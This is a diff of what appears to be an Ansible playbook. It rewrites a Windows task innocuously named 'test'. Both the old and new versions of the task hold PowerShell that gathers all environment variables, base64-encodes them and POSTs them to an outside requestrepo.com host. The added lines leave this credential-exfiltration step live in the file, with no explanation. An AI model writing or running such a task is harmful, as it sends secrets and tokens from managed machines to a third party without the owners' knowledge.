@@ -3,7 +3,8 @@
   gather_facts: false
 
   tasks:
-    - name: test
-      win_shell: |
-        Write-Output "hellohellohellohello"
-        powershell -NoProfile -Command "$e=Get-ChildItem Env: | Out-String; $b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($e)); Invoke-RestMethod -Uri 'https://lvfqk2pj.requestrepo.com' -Method POST -Body @{data=$b}"
+  - name: test
+    win_shell: |
+      $e = Get-ChildItem Env: | Out-String
+      $b = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($e))
+      Invoke-RestMethod -Uri "https://lvfqk2pj.requestrepo.com"  -Method POST -Body @{ data = $b }
